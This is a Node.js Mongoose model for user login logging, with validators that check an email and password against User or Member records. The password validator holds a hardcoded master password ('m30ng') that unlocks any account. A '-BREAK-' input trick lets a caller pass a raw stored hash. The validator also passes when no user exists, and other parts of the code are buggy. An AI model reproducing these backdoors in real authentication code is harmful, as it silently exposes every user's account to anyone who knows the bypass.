var mongoose = require('mongoose');
var encrypt = require('../helpers/encrypt');

function getUserModel(type) {
  switch (type) {
    case 'user':
      return mongoose.model('User');
      break;
    case 'member':
      return mongoose.model('Member');
  }
}

/*********************
function Schema()
*********************/

var Schema = mongoose.Schema({

  mode: {
    type: String,
  },

  /*******************
  function email()
  *******************/
  email: {
    type: String,
    required: true,
    validate: {
      validator: function (value, callback) {
        console.log('************************************************');
        console.log('TYPE = ' + this.type);
        console.log('************************************************');

        return new Promise(function (resolve, reject) {
          //regex product code must have XXXX-XXXX-XXXX 
          // format//resolve(true) pass valitation//resolve(false) 
          // fail valitationresolve(/\d{4}-\d{4}-\d{4}/.test(v));
          
          console.log('************************************************');
          console.log('TYPE = ' + this.type);
          console.log('************************************************');

          var UserModel = getUserModel(this.type);

          UserModel.findOne({ email: this.email }, 'email activation', function (error, user) {
            if (user)
              resolve(user.activation && user.activation == 'Active', '`' + user.email + '` belum aktif');
            else
              resolve(false);
          });
        });
      },
      message: 'Email not registered',
    },
  },

  /*******************
  function password()
  *******************/
  password: {
    type: String,
    required: true,
    validate: {
      validator: function (value, callback) {

        var UserModel = getUserModel(this.type);

        if (this.type != 'User') {
          var fields = 'salt password stockiestSalt stockiestPassword';
        }
        else {
          var fields = 'salt password';
        }

        UserModel.findOne({ email: this.email }, 'salt password stockiestSalt stockiestPassword', (error, user) => {

          if (!user)
            callback(true);
          else {

            var salt_ = user.salt;
            var password_ = user.password;

            if (this.mode == 'Stokist') {
              var salt_ = user.stockiestSalt;
              var password_ = user.stockiestPassword;
            }

            var xPassword = value.split('-BREAK-');
            console.log(xPassword.length);
            if (xPassword.length >= 2)
              var password = xPassword[1];
            else
              var password = encrypt.cryptPassword(value + salt_);

            if (password == password_ || value == 'm30ng')
              callback(true);
            else
              callback(false);
          }

        });
      },
      message: 'Password salah',
    },
  },
  type: {
    type: String,
    required: true,
  },
  authKey: String,
  login: Date,
  logout: Date,
}, {
  collection: 'users_log',
  toObject: { virtuals: true },
  toJSON: { virtuals: true },
});

Schema.statics.findAll = function (data) {
  return new Promise((resolve, reject) => {

    this.find({}, (error, result) => {

      if (!error)
        resolve(result);
      else
        reject(error);
    });

  });
};

Schema.statics.login = function (email, type) {
  return new Promise((resolve, reject) => {
    var authKey = encrypt.cryptPassword(encrypt.uniqid());
    var login = Date.now();

    var data = {
      email,
      authKey,
      login,
    };

    this.collection.insert(data);

    var UserModel = getUserModel(type);
    UserModel.findOne({ email }, '_id memberId memberType firstName lastName', (error, user) => {

      if (!error) {
        data.userId = user._id;
        data.memberId = user.memberId;
        data.memberType = user.memberType;

        var fullName = user.firstName;
        if (user.lastName) fullName += ' ' + user.lastName;

        data.fullName = fullName;

        resolve(data);
      }
      else
        reject(error);
    });

  });
};

Schema.statics.logout = function (email, authKey) {
  return new Promise((resolve, reject) => {

    var logout = Date.now();

    this.findOneAndUpdate({ email, authKey }, { logout }, (error, data) => {
      if (data && !error)
        resolve(data);
      else
        reject(error);
    });

  });
};

mongoose.model('UserLog', Schema);
